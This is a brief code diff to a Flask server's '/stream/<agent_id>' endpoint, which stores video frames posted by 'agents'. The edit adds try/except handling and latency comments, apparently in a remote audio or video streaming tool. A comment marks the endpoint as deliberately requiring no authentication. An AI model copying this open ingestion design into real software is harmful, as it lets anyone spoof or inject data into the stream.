@@ -1744,8 +1744,14 @@ AUDIO_CHUNKS = defaultdict(lambda: queue.Queue())
 @app.route('/stream/<agent_id>', methods=['POST'])
 # No authentication required for agent ingestion
 def stream_in(agent_id):
-    VIDEO_FRAMES[agent_id] = request.data
-    return "OK", 200
+    # Optimized for ultra-low latency streaming
+    try:
+        VIDEO_FRAMES[agent_id] = request.data
+        # Return immediately for minimal latency
+        return "OK", 200
+    except Exception as e:
+        print(f"Stream error for agent {agent_id}: {e}")
+        return "Error", 500
 
 def generate_video_frames(agent_id):
     while True:
